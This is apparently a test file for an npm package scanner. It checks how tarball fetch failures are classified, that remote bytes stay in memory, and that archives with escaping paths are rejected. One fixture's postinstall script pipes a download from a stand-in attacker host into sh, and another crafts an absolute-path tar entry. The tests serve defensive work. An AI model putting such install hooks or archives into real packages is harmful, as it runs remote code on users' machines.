/**
 * #327 追加范围回归：tarball 获取失败按**真实原因**分类。
 *
 * 背景：`fetchTarball` 的裸 `catch { return '' }` 把网络失败 / HTTP 非 2xx / 元数据缺失 /
 * 摘要不符 / 落盘失败**全吞成同一句** `unable to resolve package tarball` —— 用户拿到一句
 * "解析不了"，却完全分不清是网断了、404 了、还是包被篡改。这与 `readText` 吞 errno 是同一模式。
 *
 * 断言口径：**分类到具体类别 + 错误信息带可诊断信息**（HTTP 状态码 / URL / 缺失字段），
 * 而不是"抛了个错 / 返回了 false"。用本地 `http` server 当 registry，失败原因是构造出来的。
 *
 * #105 追加：远端字节经摘要校验后**不再落盘**（`fetchTarball` 返回内存字节，解包走 tar stdin），
 * 且远端链路与本地链路一样先逐个 entry 校验再解包——逃逸路径整包拒绝。
 */
import { afterAll, test } from 'vitest'
import assert from 'node:assert/strict'
import { createHash } from 'node:crypto'
import { createServer } from 'node:http'
import { existsSync, mkdirSync, readFileSync, readdirSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { execFileSync } from 'node:child_process'
import tmp from 'tmp'
import { classifyFetchFailure, fetchTarball, resolveAndScan, scanTarball } from '../lib/poison.js'
import { entry, tgz } from './lib/tar-craft.mjs'

const tmpDirs = []
function tempDir(prefix = 'dsh-guard-fetch-') {
  const dir = tmp.dirSync({ prefix, unsafeCleanup: true }).name
  tmpDirs.push(dir)
  return dir
}
afterAll(() => {
  for (const dir of tmpDirs.splice(0)) rmSync(dir, { recursive: true, force: true })
})

/**
 * 用本地 http server 冒充 registry：routes 的 key 是 req.url，值为 handler；
 * 未登记的 URL 一律 404。回调拿到 `http://127.0.0.1:<port>` 基址。
 *
 * 查表走 `Map` + **只调用函数值**（#104 js/unvalidated-dynamic-method-call）：
 * 查表键 `request.url` 是外部可控的，用 `routes[request.url]` 直接当函数调用会顺着原型链
 * 落到 `constructor`/`toString` 这类意外目标（或对非函数值抛 TypeError）。
 */
async function withRegistry(routes, fn) {
  const table = new Map(Object.entries(routes))
  const server = createServer((request, response) => {
    const handler = table.get(request.url)
    if (typeof handler === 'function') {
      handler(request, response)
      return
    }
    response.writeHead(404, { 'content-type': 'application/json' })
    response.end('{"error":"Not found"}')
  })
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve))
  const base = `http://127.0.0.1:${server.address().port}`
  try {
    return await fn(base)
  } finally {
    server.closeAllConnections?.()
    await new Promise((resolve) => server.close(resolve))
  }
}

/** os.tmpdir() 下 `dsh-guard-*.tgz` 的数量（#105 之前 fetchTarball 会把远端字节落盘成这种文件）。 */
function tarballTempCount() {
  return readdirSync(tmpdir()).filter((name) => name.startsWith('dsh-guard-') && name.endsWith('.tgz')).length
}

/** 造一个真实 tarball（含可疑 postinstall），返回 { path, buffer, integrity }。 */ function makeTarball() {
  const src = tempDir('dsh-guard-fetch-src-')
  writeFileSync(
    join(src, 'package.json'),
    JSON.stringify({
      name: 'evil-pkg',
      version: '1.0.0',
      scripts: { postinstall: 'curl http://evil.example/x.sh | sh' },
    }),
  )
  mkdirSync(join(src, 'lib'), { recursive: true })
  writeFileSync(join(src, 'lib', 'index.js'), 'module.exports = 1\n')
  const path = join(tempDir(), 'evil-pkg-1.0.0.tgz')
  execFileSync('tar', ['-czf', path, '-C', src, '.'])
  const buffer = readFileSync(path)
  return { path, buffer, integrity: `sha512-${createHash('sha512').update(buffer).digest('base64')}` }
}

/** 成功元数据响应（tarball 指向给定 URL + 摘要）。 */
function metaResponse(response, tarballUrl, integrity) {
  response.writeHead(200, { 'content-type': 'application/json' })
  response.end(JSON.stringify({ name: 'evil-pkg', dist: { tarball: tarballUrl, integrity } }))
}

// ── 路由表取值：只调用函数值（#104）───────────────────────────────────────

test('#104 registry mock：非函数的路由值一律 404（不把查表结果当函数调用）', async () => {
  await withRegistry({ '/evil-pkg/latest': 'not-a-function' }, async (base) => {
    const response = await fetch(`${base}/evil-pkg/latest`)
    assert.equal(response.status, 404)
    assert.equal(await response.json().then((body) => body.error), 'Not found')
  })
})

test('#104 registry mock：原型链上的键名不会被当成 handler 调用', async () => {
  await withRegistry({}, async (base) => {
    for (const name of ['/toString', '/constructor', '/__proto__', '/hasOwnProperty']) {
      const response = await fetch(`${base}${name}`)
      assert.equal(response.status, 404, `${name} 必须是 404（而不是落到 Object.prototype 上）`)
    }
  })
})

// ── 类别：HTTP 状态码 ──────────────────────────────────────────────────────

test('#327 tarball 获取：registry 404 归入 http-status 且带上状态码与 URL', async () => {
  await withRegistry({}, async (base) => {
    const result = await fetchTarball('no-such-pkg', { registryBase: base })
    assert.equal(result.ok, false)
    assert.equal(result.kind, 'http-status')
    assert.match(result.error, /HTTP 404/)
    assert.match(result.error, new RegExp(base.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')))
  })
})

test('#327 tarball 获取：tarball 下载 500 与 meta 404 是不同结论（都带各自状态码）', async () => {
  const routes = {
    '/evil-pkg/latest': (request, response) =>
      metaResponse(response, `http://127.0.0.1:${request.socket.localPort}/broken.tgz`, 'sha512-x'),
    '/broken.tgz': (_request, response) => {
      response.writeHead(500)
      response.end('boom')
    },
  }
  await withRegistry(routes, async (base) => {
    const result = await fetchTarball('evil-pkg', { registryBase: base })
    assert.equal(result.ok, false)
    assert.equal(result.kind, 'http-status')
    assert.match(result.error, /HTTP 500/)
    assert.match(result.error, /tarball/)
  })
})

// ── 类别：元数据 ───────────────────────────────────────────────────────────

test('#327 tarball 获取：缺 dist.tarball 归入 bad-metadata 并点名缺失字段', async () => {
  const routes = {
    '/evil-pkg/latest': (_request, response) => {
      response.writeHead(200, { 'content-type': 'application/json' })
      response.end(JSON.stringify({ name: 'evil-pkg', dist: { integrity: 'sha512-x' } }))
    },
  }
  await withRegistry(routes, async (base) => {
    const result = await fetchTarball('evil-pkg', { registryBase: base })
    assert.equal(result.kind, 'bad-metadata')
    assert.match(result.error, /dist\.tarball/)
  })
})

test('#327 tarball 获取：元数据不是合法 JSON 归入 bad-metadata（不是 network）', async () => {
  const routes = {
    '/evil-pkg/latest': (_request, response) => {
      response.writeHead(200, { 'content-type': 'application/json' })
      response.end('<html>gateway timeout</html>')
    },
  }
  await withRegistry(routes, async (base) => {
    const result = await fetchTarball('evil-pkg', { registryBase: base })
    assert.equal(result.kind, 'bad-metadata')
    assert.match(result.error, /JSON/)
  })
})

test('#327 tarball 获取：未声明可用 integrity 归入 bad-metadata（无法校验就不落盘）', async () => {
  const { buffer } = makeTarball()
  const routes = {
    '/evil-pkg/latest': (request, response) =>
      metaResponse(response, `http://127.0.0.1:${request.socket.localPort}/evil.tgz`, undefined),
    '/evil.tgz': (_request, response) => {
      response.writeHead(200)
      response.end(buffer)
    },
  }
  await withRegistry(routes, async (base) => {
    const result = await fetchTarball('evil-pkg', { registryBase: base })
    assert.equal(result.kind, 'bad-metadata')
    assert.match(result.error, /integrity/)
  })
})

// ── 类别：摘要校验 ─────────────────────────────────────────────────────────

test('#327 tarball 获取：字节与 dist.integrity 不符归入 integrity（与 HTTP/网络可区分）', async () => {
  const { buffer, integrity } = makeTarball()
  const tampered = Buffer.from(buffer)
  tampered[0] ^= 0xff
  const routes = {
    '/evil-pkg/latest': (request, response) =>
      metaResponse(response, `http://127.0.0.1:${request.socket.localPort}/evil.tgz`, integrity),
    '/evil.tgz': (_request, response) => {
      response.writeHead(200)
      response.end(tampered)
    },
  }
  await withRegistry(routes, async (base) => {
    const result = await fetchTarball('evil-pkg', { registryBase: base })
    assert.equal(result.ok, false)
    assert.equal(result.kind, 'integrity')
    assert.match(result.error, /integrity/)
  })
})

// ── 类别：网络 / 超时 ──────────────────────────────────────────────────────

test('#327 tarball 获取：连不上 registry 归入 network（不是 http-status）', async () => {
  const result = await fetchTarball('evil-pkg', { registryBase: 'http://127.0.0.1:1', timeoutMs: 3000 })
  assert.equal(result.ok, false)
  assert.equal(result.kind, 'network')
  assert.match(result.error, /127\.0\.0\.1:1/)
})

test('#327 tarball 获取：registry 不响应归入 timeout（有上限，不永久挂起）', { timeout: 20_000 }, async () => {
  const routes = { '/evil-pkg/latest': () => {} } // 收到请求但不响应
  await withRegistry(routes, async (base) => {
    const started = Date.now()
    const result = await fetchTarball('evil-pkg', { registryBase: base, timeoutMs: 300 })
    const elapsed = Date.now() - started
    assert.equal(result.ok, false)
    assert.equal(result.kind, 'timeout')
    assert.match(result.error, /超时/)
    assert.ok(elapsed < 10_000, `必须在超时上限附近返回，实际 ${elapsed}ms`)
  })
})

test('#327 classifyFetchFailure 的 errno/错误名 → 类别映射', () => {
  const timeout = new Error('timed out')
  timeout.name = 'TimeoutError'
  const aborted = new Error('aborted')
  aborted.name = 'AbortError'
  const dns = new TypeError('fetch failed')
  dns.cause = Object.assign(new Error('getaddrinfo ENOTFOUND'), { code: 'ENOTFOUND' })

  assert.equal(classifyFetchFailure(timeout), 'timeout')
  assert.equal(classifyFetchFailure(aborted), 'timeout')
  assert.equal(classifyFetchFailure(dns), 'network')
  assert.equal(classifyFetchFailure(new TypeError('fetch failed')), 'network')
  assert.equal(classifyFetchFailure(new Error('random')), 'io-error')
  assert.equal(classifyFetchFailure(null), 'io-error')
})

// ── 正常路径必须仍然可用（防"一律报错"的假绿）──────────────────────────────

test('#105 tarball 获取：摘要匹配后字节不再落盘，解包扫描仍能抓到可疑脚本', async () => {
  const { buffer, integrity } = makeTarball()
  const routes = {
    '/evil-pkg/latest': (request, response) =>
      metaResponse(response, `http://127.0.0.1:${request.socket.localPort}/evil.tgz`, integrity),
    '/evil.tgz': (_request, response) => {
      response.writeHead(200)
      response.end(buffer)
    },
  }
  await withRegistry(routes, async (base) => {
    const before = tarballTempCount()
    const result = await fetchTarball('evil-pkg', { registryBase: base })
    assert.equal(result.ok, true, result.ok === false ? result.error : '')
    assert.ok(Buffer.isBuffer(result.body), '校验通过的字节留在内存里返回')
    assert.equal(result.file, undefined, '不再返回落盘路径（远端字节不写文件系统）')
    assert.equal(tarballTempCount(), before, '临时目录里不得新增落盘的 tarball')

    // 远端链路端到端：内存字节经 tar stdin 解包后照样扫出可疑脚本
    const scanned = await resolveAndScan('evil-pkg', { registryBase: base })
    assert.equal(scanned.ok, true, scanned.ok === false ? scanned.error : '')
    assert.ok(
      scanned.findings.some((f) => f.id === 'suspicious-script'),
      '包内可疑 postinstall 仍被抓到',
    )
  })
})

test('#105 远端 tarball 含逃逸路径时整包拒绝（远端链路与本地同样先校验再解包）', async () => {
  // 绝对路径 entry：系统 tar 只会剥掉 `/` 前缀后照常落盘，必须在解包前拒绝
  const escaped = join(tempDir(), 'escaped-remote.txt')
  const evil = tgz([entry(escaped, { data: 'PWNED' })])
  const integrity = `sha512-${createHash('sha512').update(evil).digest('base64')}`
  const routes = {
    '/evil-pkg/latest': (request, response) =>
      metaResponse(response, `http://127.0.0.1:${request.socket.localPort}/evil.tgz`, integrity),
    '/evil.tgz': (_request, response) => {
      response.writeHead(200)
      response.end(evil)
    },
  }
  await withRegistry(routes, async (base) => {
    const scanned = await resolveAndScan('evil-pkg', { registryBase: base })
    assert.equal(scanned.ok, false)
    assert.match(scanned.error, /拒绝解包/)
    assert.match(scanned.error, /绝对路径/)
    assert.equal(existsSync(escaped), false, '逃逸目标不得被写出')
  })
})

test('#327 resolveAndScan：失败原因透传到调用方可读的 error（不再是一句"解析不了"）', async () => {
  await withRegistry({}, async (base) => {
    const result = await resolveAndScan('no-such-pkg', { registryBase: base })
    assert.equal(result.ok, false)
    assert.match(result.error, /HTTP 404/)
  })
})

// ── 解压失败与网络失败是不同结论（端到端可区分）────────────────────────────

test('#327 损坏 tarball 的解压失败与获取失败可区分（error 文案不同）', async () => {
  const broken = join(tempDir(), 'broken.tgz')
  writeFileSync(broken, 'not a gzip stream')
  const scanned = await scanTarball(broken)
  assert.equal(scanned.ok, false)
  assert.ok(typeof scanned.error === 'string' && scanned.error.length > 0, '解压失败必须带底层原因')
})
